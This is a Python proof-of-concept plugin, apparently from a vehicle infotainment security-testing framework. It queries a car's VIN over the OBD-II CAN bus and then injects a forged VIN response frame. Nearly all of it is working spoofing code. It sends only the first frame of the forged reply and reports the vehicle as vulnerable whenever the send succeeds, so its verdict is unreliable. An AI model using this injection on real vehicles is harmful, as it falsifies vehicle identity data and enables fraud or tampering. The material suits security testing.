"""
PoC Name: OBD-II VIN Spoofing
CVE: N/A
Component: OBD-II Protocol
Category: Protocol
Severity: Medium
CVSS: 5.0
Description: 通过CAN总线发送伪造VIN响应,验证OBD-II是否缺少VIN完整性保护。
Prerequisites: SocketCAN接口, python-can库。
Usage: python3 44_OBD_VIN_Spoof.py <can_interface>
"""
import sys
from iv_plugin_base import IVIVulnerabilityPlugin
class OBDVINSpoofPlugin(IVIVulnerabilityPlugin):
    def check_prerequisites(self): return True
    def exploit(self):
        iface = self.params.get("can_interface", "can0")
        self.logger.info(f"OBD-II VIN欺骗测试 ({iface})...")
        try:
            import can
            bus = can.interface.Bus(channel=iface, bustype="socketcan")
            # First query VIN (Mode 09 PID 02)
            query = can.Message(arbitration_id=0x7DF,
                data=[0x02, 0x09, 0x02, 0,0,0,0,0], is_extended_id=False)
            bus.send(query)
            resp = bus.recv(timeout=2.0)
            if resp:
                self.logger.info(f"原始VIN响应: {resp.data.hex()}")
            # Inject fake VIN response
            fake_vin = b"FAKEVIN12345678"
            fake_resp = can.Message(arbitration_id=0x7E8,
                data=[0x10, 0x14, 0x49, 0x02, 0x01] + list(fake_vin[:3]),
                is_extended_id=False)
            bus.send(fake_resp)
            self.logger.warning("[+] 伪造VIN响应已注入")
            self.results["vulnerable"] = True
            self.results["evidence"] = "Fake VIN response injected"
            bus.shutdown()
        except ImportError:
            self.logger.error("python-can未安装")
            self.results["vulnerable"] = False
        except Exception as e:
            self.logger.error(f"VIN欺骗测试失败: {e}")
            self.results["vulnerable"] = False
        return self.results
if __name__ == "__main__":
    iface = sys.argv[1] if len(sys.argv) > 1 else "can0"
    plugin = OBDVINSpoofPlugin({"target_ip": "N/A", "can_interface": iface})
    plugin.run_verify()
